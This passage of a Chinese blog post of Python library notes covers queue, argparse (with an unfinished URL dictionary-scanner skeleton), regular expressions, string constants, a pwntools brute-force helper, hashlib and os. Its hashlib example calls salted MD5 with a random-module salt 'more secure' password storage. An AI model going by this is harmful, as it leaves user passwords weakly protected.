class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    q = queue.Queue(<span class="number">3</span>)  <span class="comment"># 设置队列上限为3</span></span><br><span class="line">    q.put(<span class="string">'python'</span>)  <span class="comment"># 在队列中插入字符串 'python'</span></span><br><span class="line">    q.put(<span class="string">'-'</span>) <span class="comment"># 在队列中插入字符串 '-'</span></span><br><span class="line">    q.put(<span class="string">'100'</span>) <span class="comment"># 在队列中插入字符串 '100'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):  <span class="comment"># 从队列中取数据，取出次数为4次，引发 queue.Empty 异常</span></span><br><span class="line">        print(q.get(block=<span class="keyword">False</span>))</span><br><span class="line"><span class="keyword">except</span> queue.Empty:</span><br><span class="line">    print(<span class="string">'queue.Empty'</span>)</span><br></pre></td></tr></table></figure><h3 id="0x04-argparse-库"><a class="markdownIt-Anchor" href="#0x04-argparse-库"></a> 0x04 argparse 库</h3><blockquote><p><a href="https://docs.python.org/zh-cn/3/library/argparse.html" target="_blank" rel="noopener">官方文档</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scan</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url, inputDict, output, threadNum)</span>:</span></span><br><span class="line">        self.url = url <span class="keyword">if</span> url.find(<span class="string">"://"</span>) != <span class="number">-1</span> <span class="keyword">else</span> <span class="string">"http://"</span>+url</span><br><span class="line">        self.inputDict = inputDict</span><br><span class="line">        self.oFileName = output+<span class="string">".txt"</span> </span><br><span class="line">        self.threadNum = threadNum</span><br><span class="line">        self.lock = threading.RLock()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">"url"</span>,   help = <span class="string">"the url you want to scan"</span>, type=str)</span><br><span class="line">    parser.add_argument(<span class="string">"-t"</span>, <span class="string">"--threadNum"</span>, dest=<span class="string">"threadNum"</span>, help = <span class="string">"The number of thread you scanning."</span>, type = int, default = <span class="number">60</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-i"</span>, <span class="string">"--input"</span>, dest=<span class="string">"inputDict"</span>, help = <span class="string">"The input about dictionary"</span>, type=str,default = <span class="string">"dict1.txt"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-o"</span>, <span class="string">"--output"</span>,dest=<span class="string">"output"</span>, help=<span class="string">"the file of output"</span>, type=str, default=<span class="string">"result"</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    scan = Scan(args.url, args.inputDict, args.output, args.threadNum)</span><br><span class="line">……</span><br></pre></td></tr></table></figure><blockquote><p>通过上面的不健全的代码可以看出argparse的用途，下面进行总结，首先创建一个解析器：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; parser = argparse.ArgumentParser(description = <span class="string">"This is a test"</span>)</span><br></pre></td></tr></table></figure><h4 id="1argparse-常用的方法"><a class="markdownIt-Anchor" href="#1argparse-常用的方法"></a> 1.argparse 常用的方法</h4><p>① <code>parser.add_argument()</code>：添加参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.add_argument(<span class="string">'integers'</span>, metavar=<span class="string">'N'</span>, type=int, nargs=<span class="string">'+'</span>, help=<span class="string">'an integer for the accumulator'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.add_argument(<span class="string">'--sum'</span>, dest=<span class="string">'accumulate'</span>, action=<span class="string">'store_const'</span>, const=sum, default=max, help=<span class="string">'sum the integers (default: find the max)'</span>)</span><br></pre></td></tr></table></figure><blockquote><p>定义单个的命令行参数应当如何解析。每个形参都在下面有它自己更多的描述，长话短说有：</p></blockquote><ul><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#name-or-flags" target="_blank" rel="noopener">name or flags</a> - 一个命名或者一个选项字符串的列表，例如 <code>foo</code> 或 <code>-f, --foo</code>。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#action" target="_blank" rel="noopener">action</a> - 当参数在命令行中出现时使用的动作基本类型。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#nargs" target="_blank" rel="noopener">nargs</a> - 命令行参数应当消耗的数目。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#const" target="_blank" rel="noopener">const</a> - 被一些 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#action" target="_blank" rel="noopener">action</a> 和 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#nargs" target="_blank" rel="noopener">nargs</a> 选择所需求的常数。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#default" target="_blank" rel="noopener">default</a> - 当参数未在命令行中出现时使用的值。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#type" target="_blank" rel="noopener">type</a> - 命令行参数应当被转换成的类型。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#choices" target="_blank" rel="noopener">choices</a> - 可用的参数的容器。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#required" target="_blank" rel="noopener">required</a> - 此命令行选项是否可省略 （仅选项可用）。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#help" target="_blank" rel="noopener">help</a> - 一个此选项作用的简单描述。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#metavar" target="_blank" rel="noopener">metavar</a> - 在使用方法消息中使用的参数值示例。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#dest" target="_blank" rel="noopener">dest</a> - 被添加到 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser.parse_args" target="_blank" rel="noopener"><code>parse_args()</code></a> 所返回对象上的属性名。</li></ul><p>② <code>args = parser.parse_args()</code>：解析参数</p><blockquote><p>将参数字符串转换为对象并将其设为命名空间的属性。 返回带有成员的命名空间。之前对 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser.add_argument" target="_blank" rel="noopener"><code>add_argument()</code></a> 的调用决定了哪些对象被创建以及它们如何被赋值。 请参阅 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser.add_argument" target="_blank" rel="noopener"><code>add_argument()</code></a> 的文档了解详情。</p></blockquote><ul><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#args" target="_blank" rel="noopener">args</a> - 要解析的字符串列表。 默认值是从 <a href="https://docs.python.org/zh-cn/3/library/sys.html#sys.argv" target="_blank" rel="noopener"><code>sys.argv</code></a> 获取。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#namespace" target="_blank" rel="noopener">namespace</a> - 用于获取属性的对象。 默认值是一个新的空 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.Namespace" target="_blank" rel="noopener"><code>Namespace</code></a> 对象。</li></ul><h3 id="0x05-re-库正则表达式"><a class="markdownIt-Anchor" href="#0x05-re-库正则表达式"></a> 0x05 re 库（正则表达式）</h3><h4 id="1核心笔记"><a class="markdownIt-Anchor" href="#1核心笔记"></a> 1.核心笔记</h4><blockquote><p>在讨论正则表达式时，会用术语“匹配”（matching），指的是术语“模式匹配”（pattern-matching）。在Python专门术语中，有两种方法完成模式匹配：搜索（searching）和匹配（matching）。</p></blockquote><ul><li>搜索，即在字符串任一部分中搜索匹配的模式，是通过search()函数或方法来实现</li><li>匹配，指的是判断一个字符串能否从起始处全部或部分的匹配某个模式，时调用match()函数或方法实现的</li></ul><h4 id="2正则表达式中常见的符号和字符"><a class="markdownIt-Anchor" href="#2正则表达式中常见的符号和字符"></a> 2.正则表达式中常见的符号和字符</h4><p>如右图</p><h4 id="3常用的函数和方法"><a class="markdownIt-Anchor" href="#3常用的函数和方法"></a> 3.常用的函数和方法</h4><table><thead><tr><th>函数/方法</th><th>描述</th></tr></thead><tbody><tr><td><strong>模块的函数</strong></td><td></td></tr><tr><td>compile(pattern, flags=0)</td><td>对正则表达式模式pattern进行编译，flags是可选标志，并返回一个regex对象</td></tr><tr><td><strong>re模块的函数和regex对象的方法</strong></td><td></td></tr><tr><td>match(pattern, , string, flags=0)</td><td>尝试用正则表达式模式 pattern 匹配字符串 string，flags是可选标识符，<br>如果匹配成功，则返回一个匹配对象；否则返回None</td></tr><tr><td>search(pattern ,string, flags=0)</td><td>在字符串 string 中搜索正则表达式模式 pattern 的第一次出现，flags是可选标识符<br>如果匹配成功，则返回一个匹配对象；否则返回None</td></tr><tr><td>findall(pattern, string[, flag])</td><td>在字符串 string 中搜索正则表达式模式 pattern 的所有（非重复）出现；<br>返回一个匹配对象的列表</td></tr><tr><td><strong>匹配对象的方法</strong></td><td></td></tr><tr><td>group(num=0)</td><td>返回全部匹配对象（或指定编号是 num 的子组）</td></tr><tr><td>groups()</td><td>返回一个包含全部匹配的子组的元组，没有匹配成功，则返回一个空的元组</td></tr></tbody></table><h4 id="4compile相关知识点"><a class="markdownIt-Anchor" href="#4compile相关知识点"></a> 4.compile()相关知识点</h4><blockquote><p>在模式匹配之前，正则表达式模式必须现被编译成regex对象，由于正则表达式在执行过程中被多次用于比较，强烈建议先对它进行预编译，而且既然正则表达式的编译是必须的，那是用预先编译来提升性能无疑是明智之举，re.compile()就是提供此功能（给match、search和findall提供regex对象）</p></blockquote><h4 id="5match-search和findall的区别"><a class="markdownIt-Anchor" href="#5match-search和findall的区别"></a> 5.match、search和findall的区别</h4><blockquote><ul><li>搜索，即在字符串任一部分中搜索匹配的模式，是通过search()函数或方法来实现</li><li>匹配，指的是判断一个字符串能否从起始处全部或部分的匹配某个模式，时调用match()函数或方法实现的</li><li>findall，与上面两个不同之处是：findall总是返回一个列表，如果findall如果没有找到匹配的部分，会返回空列表；如果成功找到匹配的部分，则返回所有匹配部分的列表</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; m = <span class="string">"Hello Wang; Hello LI"</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; re.match(<span class="string">"Hello"</span>,m)</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; &lt;re.Match object; span=(0, 5), match=<span class="string">'Hello'</span>&gt;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; re.search(<span class="string">"Hello"</span>,m)</span></span><br><span class="line">&lt;re.Match object; span=(0, 5), match='Hello'&gt;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; re.findall(<span class="string">"Hello"</span>,m)</span></span><br><span class="line">['Hello', 'Hello']</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; re.match(<span class="string">"LI"</span>,m)</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; <span class="built_in">type</span>(re.match(<span class="string">"LI"</span>,m))</span></span><br><span class="line">&lt;class 'NoneType'&gt;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; re.search(<span class="string">"LI"</span>,m)</span></span><br><span class="line">&lt;re.Match object; span=(18, 20), match='LI'&gt;</span><br></pre></td></tr></table></figure><h3 id="0x06-string-模块字符串"><a class="markdownIt-Anchor" href="#0x06-string-模块字符串"></a> 0x06 string 模块（字符串）</h3><h4 id="1字符串常量"><a class="markdownIt-Anchor" href="#1字符串常量"></a> 1.字符串常量</h4><p><code>string.ascii_letters</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.ascii_letters</span><br><span class="line"><span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br></pre></td></tr></table></figure><blockquote><p>大小写字母的总和，该值不依赖于语言区域。</p></blockquote><p><code>string.ascii_lowercase</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.ascii_lowercase</span><br><span class="line"><span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br></pre></td></tr></table></figure><blockquote><p>小写字母 <code>'abcdefghijklmnopqrstuvwxyz'</code>。 该值不依赖于语言区域，不会发生改变。</p></blockquote><p><code>string_ascii_uppercase</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.ascii_uppercase</span><br><span class="line"><span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br></pre></td></tr></table></figure><blockquote><p>大写字母 <code>'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</code>。 该值不依赖于语言区域，不会发生改变。</p></blockquote><p><code>string.digits</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.digits</span><br><span class="line"><span class="string">'0123456789'</span></span><br></pre></td></tr></table></figure><blockquote><p>字符串 <code>'0123456789'</code>。</p></blockquote><p><code>string.hexdigits</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.hexdigits</span><br><span class="line"><span class="string">'0123456789abcdefABCDEF'</span></span><br></pre></td></tr></table></figure><blockquote><p>字符串 <code>'0123456789abcdefABCDEF'</code></p></blockquote><p><code>string.octdigits</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.octdigits</span><br><span class="line"><span class="string">'01234567'</span></span><br></pre></td></tr></table></figure><p><code>string.punctuation</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.punctuation</span><br><span class="line"><span class="string">'!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~'</span></span><br></pre></td></tr></table></figure><blockquote><p>由在 <code>C</code> 区域设置中被视为标点符号的 ASCII 字符所组成的字符串: <code>!&quot;#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_</code>{|}~`.</p></blockquote><p><code>string.printable</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.printable</span><br><span class="line"><span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ \t\n\r\x0b\x0c'</span></span><br></pre></td></tr></table></figure><blockquote><p>由被视为可打印符号的 ASCII 字符组成的字符串。 这是 <a href="https://docs.python.org/zh-cn/3/library/string.html#string.digits" target="_blank" rel="noopener"><code>digits</code></a>, <a href="https://docs.python.org/zh-cn/3/library/string.html#string.ascii_letters" target="_blank" rel="noopener"><code>ascii_letters</code></a>, <a href="https://docs.python.org/zh-cn/3/library/string.html#string.punctuation" target="_blank" rel="noopener"><code>punctuation</code></a> 和 <a href="https://docs.python.org/zh-cn/3/library/string.html#string.whitespace" target="_blank" rel="noopener"><code>whitespace</code></a> 的总和。</p></blockquote><p><code>string.whitespace</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.whitespace</span><br><span class="line"><span class="string">' \t\n\r\x0b\x0c'</span></span><br></pre></td></tr></table></figure><h4 id="2常用方法"><a class="markdownIt-Anchor" href="#2常用方法"></a> 2.常用方法</h4><p><img src="/images/148-1.png" alt></p><h3 id="0x06-pwntools-库"><a class="markdownIt-Anchor" href="#0x06-pwntools-库"></a> 0x06 pwntools 库</h3><h4 id="1pwnlibutiliters"><a class="markdownIt-Anchor" href="#1pwnlibutiliters"></a> 1.pwnlib.util.iters</h4><p><code>pwnlib.util.iters.bruteforce(func, alphabet, length, method = 'upto', start = None)</code></p><blockquote><p><code>作用</code>：成功暴力破解func函数，并且返回true。func 的输入应该是字符串，返回一个bool类型值。func将使用alphabet中的字符串进行调用，直到返回True或搜索空间已用尽。 参数start可以用于分割搜索空间，如果有多个CPU内核可用，这将很有用。</p><p><code>参数</code>：</p><ul><li><strong>func</strong>：暴力破解的函数</li><li><strong>alphabet</strong>：从中绘制符号的字母。</li><li><strong>length</strong>：最长的字符串尝试</li><li><strong>method</strong>：如果是 “<strong>upto</strong>” 尝试使用长度为1… length的字符串，如果是 “<strong>fixed</strong>” 仅尝试使用长度为length的字符串，如果是 “ <strong>downfrom</strong>” 尝试使用长度为length … 1的字符串</li><li><strong>start</strong>：一个元组（i，N），它将搜索空间分成N个片段，并从第i个片段（1…N）开始。None 等于（1，1）</li></ul><p><code>导入</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> bruteforce</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="0x07-hashlib-库"><a class="markdownIt-Anchor" href="#0x07-hashlib-库"></a> 0x07 hashlib 库</h3><h4 id="1常用的摘要函数"><a class="markdownIt-Anchor" href="#1常用的摘要函数"></a> 1.常用的摘要函数</h4><blockquote><p>这个模块针对不同的安全哈希和消息摘要算法实现了一个通用的接口。包括 FIPS 的 <code>SHA1</code>, <code>SHA224</code>, <code>SHA256</code>, <code>SHA384</code>, and <code>SHA512</code> (定义于 FIPS 180-2) 算法，以及 RSA 的 <code>MD5</code> 算法( 定义于 Internet <a href="https://tools.ietf.org/html/rfc1321.html" target="_blank" rel="noopener"><strong>RFC 1321</strong></a>)。术语“安全哈希”和“消息摘要”是可互换的，较旧的算法被称为消息摘要，现代术语是安全哈希。</p></blockquote><h4 id="2常用的方法"><a class="markdownIt-Anchor" href="#2常用的方法"></a> 2.常用的方法</h4><p><code>hash.update(data)</code></p><blockquote><p>用 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-bytes-like-object" target="_blank" rel="noopener">bytes-like object</a> 来更新哈希对象。 重复调用相当于单次调用并传入所有参数的拼接结果: <code>m.update(a); m.update(b)</code> 等价于 <code>m.update(a+b)</code>。</p></blockquote><p><code>hash.digest()</code></p><blockquote><p>返回当前已传给 update() 方法的数据摘要。 这是一个大小为 digest_size 的字节串对象，字节串中可包含 0 至 255 的完整取值范围。</p></blockquote><p><code>hash.hexdigest()</code></p><blockquote><p>类似于 digest() 但摘要会以两倍长度字符串对象的形式返回，其中仅包含十六进制数码。 这可以被用于在电子邮件或其他非二进制环境中安全地交换数据值。</p></blockquote><p><code>hash.copy()</code></p><blockquote><p>返回哈希对象的副本（“克隆”）。 这可被用来高效地计算共享相同初始子串的数据的摘要。</p></blockquote><h4 id="3两种表示方法"><a class="markdownIt-Anchor" href="#3两种表示方法"></a> 3.两种表示方法</h4><p><code>第一种</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = hashlib.sha256()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.update(<span class="string">b"HackerLee"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.digest()</span><br><span class="line"><span class="string">b'\xd1\xb8N\xa4\'\xa5vl\x81W\x1f\xb0E\x90\xe4\xe2\xf0;\xb4\x95\xa1\x92ol%\xbb-\x91\xd5I"$'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.hexdigest()</span><br><span class="line"><span class="string">'d1b84ea427a5766c81571fb04590e4e2f03bb495a1926f6c25bb2d91d5492224'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.digest_size</span><br><span class="line"><span class="number">32</span></span><br></pre></td></tr></table></figure><p><code>第二种</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.sha256(<span class="string">b'HackerLee'</span>).hexdigest()</span><br><span class="line"><span class="string">'d1b84ea427a5766c81571fb04590e4e2f03bb495a1926f6c25bb2d91d5492224'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.sha256(<span class="string">b'HackerLee'</span>).digest()</span><br><span class="line"><span class="string">b'\xd1\xb8N\xa4\'\xa5vl\x81W\x1f\xb0E\x90\xe4\xe2\xf0;\xb4\x95\xa1\x92ol%\xbb-\x91\xd5I"$'</span></span><br></pre></td></tr></table></figure><h4 id="4实际应用"><a class="markdownIt-Anchor" href="#4实际应用"></a> 4.实际应用</h4><p><code>根据用户输入的登录名和口令模拟用户注册，计算更安全的MD5</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,usr,password)</span>:</span></span><br><span class="line">        self.usr = usr</span><br><span class="line">        self.salt = <span class="string">''</span>.join([chr(random.randint(<span class="number">48</span>, <span class="number">122</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>)])</span><br><span class="line">        self._getMd5</span><br><span class="line">        self.password = self._getMd5(password+self.salt)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_getMd5</span><span class="params">(self,password)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> hashlib.md5(password.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    user = db[username]</span><br><span class="line">    salt = user.salt</span><br><span class="line">    <span class="keyword">return</span> user.password == user._getMd5(password+salt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    db = &#123;</span><br><span class="line">    <span class="string">'michael'</span>: User(<span class="string">'michael'</span>, <span class="string">'123456'</span>),</span><br><span class="line">    <span class="string">'bob'</span>: User(<span class="string">'bob'</span>, <span class="string">'abc999'</span>),</span><br><span class="line">    <span class="string">'alice'</span>: User(<span class="string">'alice'</span>, <span class="string">'alice2008'</span>)</span><br><span class="line">&#125;   </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span> login(<span class="string">"bob"</span>,<span class="string">"adbc999"</span>)</span><br><span class="line">    <span class="keyword">except</span> AssertionError:</span><br><span class="line">        print(<span class="string">"Your username or password is wrong"</span>)</span><br></pre></td></tr></table></figure><h3 id="0x08-os-模块"><a class="markdownIt-Anchor" href="#0x08-os-模块"></a> 0x08 os 模块</h3><h4 id="1osname"><a class="markdownIt-Anchor" href="#1osname"></a> <a href="http://1.os.name" target="_blank" rel="noopener">1.os.name</a></h4><blockquote><p>指示你正在使用的工作平台。比如对于Windows，它是’nt’，而对于Linux/Unix用户，它是’posix’</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.name</span><br><span class="line"><span class="string">'nt'</span></span><br></pre></td></tr></table></figure><h4 id="2oslistdir-方法"><a class="markdownIt-Anchor" href="#2oslistdir-方法"></a> 2.os.listdir() 方法</h4><blockquote><p>os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。</p><p>它不包括 <strong>.</strong> 和 <strong>…</strong> 即使它在文件夹中。只支持在 Unix, Windows 下使用。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">path = <span class="string">"/var/www/html/"</span></span><br><span class="line">dirs = os.listdir( path )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出所有文件和文件夹</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> dirs:</span><br><span class="line">   print(file)</span><br></pre></td></tr></table></figure><p>执行以上程序输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">test.htm</span><br><span class="line">stamp</span><br><span class="line">faq.htm</span><br><span class="line">_vti_txt</span><br><span class="line">robots.txt</span><br><span class="line">itemlisting</span><br><span class="line">resumelisting</span><br><span class="line">writing_effective_resume.htm</span><br><span class="line">advertisebusiness.htm</span><br><span class="line">papers</span><br><span class="line">resume</span><br></pre></td></tr></table></figure><h4 id="3oswalk-方法"><a class="markdownIt-Anchor" href="#3oswalk-方法"></a> 3.os.walk() 方法</h4><blockquote><p>os.walk() 方法用于通过在目录树中游走输出在目录中的文件名，向上或者向下。os.walk() 